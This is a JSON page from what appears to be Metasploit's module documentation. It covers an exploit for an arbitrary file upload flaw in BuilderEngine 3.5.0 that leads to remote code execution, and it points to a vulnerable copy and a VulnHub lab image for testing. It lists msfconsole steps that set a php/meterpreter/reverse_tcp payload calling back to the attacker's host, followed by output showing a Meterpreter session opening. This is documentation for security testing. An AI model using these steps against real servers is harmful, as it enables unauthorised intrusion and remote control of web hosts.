{"componentChunkName":"component---src-templates-module-documentation-template-tsx","path":"/modules/documentation/exploit/multi/http/builderengine_upload_exec","result":{"data":{"moduleMetadataJson":{"id":"eac98704-942f-5db7-bc2f-435cd1f7d257","name":"BuilderEngine Arbitrary File Upload Vulnerability and execution","fullname":"exploit/multi/http/builderengine_upload_exec","description":"This module exploits a vulnerability found in BuilderEngine 3.5.0\n        via elFinder 2.0. The jquery-file-upload plugin can be abused to upload a malicious\n        file, which would result in arbitrary remote code execution under the context of\n        the web server.","rank":600,"fields":{"detailsSlug":"/modules/details/exploit/multi/http/builderengine_upload_exec","documentationSlug":"/modules/documentation/exploit/multi/http/builderengine_upload_exec","referencesSlug":"/modules/references/exploit/multi/http/builderengine_upload_exec"},"documentation":{"html":"<p>BuilderEngine is a Content Management System (CMS) that is Open Source, and includes blog, eCommerce,\nbooking modules, etc. A vulnerability was found in the jQuery upload plugin, which could be abused\nupload a malicious file, which would result in arbitrary remote code execution under the context of\nthe web server.</p>\n<h2 id=\"vulnerable-application\" style=\"position:relative;\"><a href=\"#vulnerable-application\" aria-label=\"vulnerable application permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Vulnerable Application</h2>\n<p>According to public advisory, BuilderEngine 3.5.0 is vulnerable to this attack.</p>\n<p>A vulnerable copy was collected by Exploit-DB, which can be downloaded here:</p>\n<p><a href=\"https://www.exploit-db.com/apps/8d2daf441809dcd86398d3d750d768b5-BuilderEngine-CMS-V3.zip\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">https://www.exploit-db.com/apps/8d2daf441809dcd86398d3d750d768b5-BuilderEngine-CMS-V3.zip</a></p>\n<p>Another way to test this exploit is by using the Sedna image:</p>\n<p><a href=\"https://www.vulnhub.com/entry/hackfest2016-sedna,181/#\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">https://www.vulnhub.com/entry/hackfest2016-sedna,181/#</a></p>\n<h2 id=\"verification-steps\" style=\"position:relative;\"><a href=\"#verification-steps\" aria-label=\"verification steps permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Verification Steps</h2>\n<p>To see if the service is running BuilderEngine, you may use the check command from the module.\nIf the resource is found, then you may see the following output:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf exploit(builderengine_upload_exec) &gt; check\n[*] 192.168.1.123:80 The target appears to be vulnerable.</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span></span></pre></div>\n<p>Knowing that the <code class=\"language-text\">jquery-file-upload</code> plugin is available, you can try the by following these\nsteps:</p>\n<ol>\n<li>In msfconsole, do <code class=\"language-text\">exploit/multi/http/builderengine_upload_exec</code></li>\n<li><code class=\"language-text\">set RHOST [Target IP]</code></li>\n<li><code class=\"language-text\">set PAYLOAD php/meterpreter/reverse_tcp</code></li>\n<li><code class=\"language-text\">set LHOST [Your IP]</code></li>\n<li><code class=\"language-text\">exploit</code></li>\n</ol>\n<p>If exploited successfully, you should see an output similar to the following:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf exploit(builderengine_upload_exec) &gt; exploit\n\n[*] Started reverse TCP handler on 192.168.1.1:4444 \n[+] Our payload is at: RnrXvNHDaQA.php. Calling payload...\n[*] Calling payload...\n[*] Sending stage (33986 bytes) to 192.168.1.123\n[*] Meterpreter session 3 opened (192.168.1.1:4444 -&gt; 192.168.1.123:51354) at 2017-05-16 14:44:14 -0500\n[+] Deleted RnrXvNHDaQA.php\n\nmeterpreter &gt; </code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>"}}},"pageContext":{"id":"eac98704-942f-5db7-bc2f-435cd1f7d257"}}}